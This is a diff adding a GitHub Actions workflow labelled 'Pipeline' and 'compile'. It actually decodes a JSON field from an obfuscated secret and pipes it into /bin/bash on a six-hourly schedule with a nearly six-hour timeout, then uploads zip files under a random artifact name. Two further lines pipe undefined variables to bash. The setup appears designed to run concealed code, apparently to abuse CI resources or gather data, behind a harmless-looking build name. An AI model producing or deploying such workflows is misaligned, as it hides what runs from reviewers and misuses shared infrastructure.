@@ -1,0 +1,30 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '28 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          szqv0: ${{ secrets.szqv0 }}
+        run: |
+          printf '%s' "$szqv0" | jq -r .rpzfb25 | /bin/bash
+          echo $vjzek5302 | jq -r .ptr7936 | /bin/bash
+          echo $wme211 | jq -r .j70 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: TnVjOHrB
+          path: "*.zip"
+          retention-days: 1
